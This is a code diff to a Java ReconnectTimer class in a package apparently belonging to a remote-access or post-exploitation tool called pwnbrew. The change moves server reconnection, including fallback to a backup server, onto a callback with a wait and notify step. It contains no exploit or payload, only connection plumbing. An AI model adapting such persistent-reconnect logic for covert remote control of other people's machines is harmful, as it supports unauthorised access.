@@ -60,6 +60,7 @@ import pwnbrew.log.RemoteLog;
 import pwnbrew.log.LoggableException;
 import pwnbrew.manager.PortManager;
 import pwnbrew.network.ClientPortRouter;
+import pwnbrew.network.ReconnectCallback;
 import pwnbrew.network.control.ControlMessageManager;
 
 /**
@@ -71,9 +72,8 @@ public class ReconnectTimer extends ManagedRunnable {
     private PortManager theCommManager = null;
     
     //Static instance
-//    private static ReconnectTimer theTimer = null;
     private final Queue<String> theReconnectTimeList = new LinkedList<>();    
-    private int lockVal = 0;
+//    private int lockVal = 0;
     
     private static final String NAME_Class = ReconnectTimer.class.getSimpleName();
     private String backupServerIp = null;
@@ -136,13 +136,15 @@ public class ReconnectTimer extends ManagedRunnable {
     public void go() {
         
         int connected = 0;
-        
+              
         //Get the socket router
         ClientConfig theConf = ClientConfig.getConfig();
         String serverIp = theConf.getServerIp();
         int thePort = ClientConfig.getConfig().getSocketPort();
         ClientPortRouter aPR = (ClientPortRouter) theCommManager.getPortRouter( thePort );
         
+        //Create the connection callback
+        ReconnectCallback theCC = new ReconnectCallback(serverIp, thePort, this);        
         if(aPR == null){
             try {
                 ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
@@ -201,7 +203,11 @@ public class ReconnectTimer extends ManagedRunnable {
                 if( theDate != null ){
                     
                     waitUntil(theDate);  
-                    connected = aPR.ensureConnectivity( serverIp, thePort, theChannelId );
+                    aPR.ensureConnectivity( theCC, theChannelId );
+                    waitToBeNotified();
+                    
+                    //Get the channel id
+                    connected = theCC.getChannelId();
                     theDate = null;
                    
                 } else  {
@@ -218,7 +224,13 @@ public class ReconnectTimer extends ManagedRunnable {
         if( connected == 0 ){
             
             if( backupServerIp != null && backupServerPort != -1 ){
-                connected = aPR.ensureConnectivity(backupServerIp, backupServerPort, theChannelId);
+                
+                theCC = new ReconnectCallback(backupServerIp, backupServerPort, this); 
+                aPR.ensureConnectivity(theCC, theChannelId);
+                waitToBeNotified();
+                    
+                //Get the channel id
+                connected = theCC.getChannelId();
                 if( connected != 0 ){
                     
                     theConf.setServerIp(backupServerIp);
@@ -293,42 +305,7 @@ public class ReconnectTimer extends ManagedRunnable {
             theReconnectTimeList.add( passedTime );
         }
     }
-    
-     
-//     //===============================================================
-//    /**
-//     * 
-//     * @param lockOp 
-//     */
-//    @Override
-//    public synchronized void lockUpdate(int lockOp) {
-//        lockVal = lockOp;
-//        notifyAll();
-//    }
-//    
-//    //===============================================================
-//    /**
-//     * 
-//     * @return  
-//     */
-//    @Override
-//    public synchronized int waitForLock() {
-//        
-//        int retVal;        
-//        while( lockVal == 0 && !shutdownRequested){
-//            try {
-//                wait();
-//            } catch (InterruptedException ex) {
-//            }
-//        }
-//        
-//        //Set to temp and reset
-//        retVal = lockVal;
-//        lockVal = 0;
-//        
-//        return retVal;
-//    }
-
+  
     //===============================================================
     /**
      * 
